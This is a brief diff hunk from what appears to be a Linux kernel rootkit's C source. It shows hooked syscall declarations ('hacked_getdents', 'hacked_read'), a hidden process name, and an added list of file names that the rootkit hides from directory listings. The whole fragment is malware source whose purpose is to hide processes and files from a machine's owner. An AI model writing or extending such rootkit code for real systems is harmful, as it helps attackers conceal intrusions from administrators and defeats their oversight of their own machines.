@@ -63,3 +63,5 @@ asmlinkage long hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsi
 asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count);
 
 char *HIDDEN_PROCESS = "bash";
+
+const char * const HIDDEN_FILES[] = {"hideme.txt", "Makefile"};
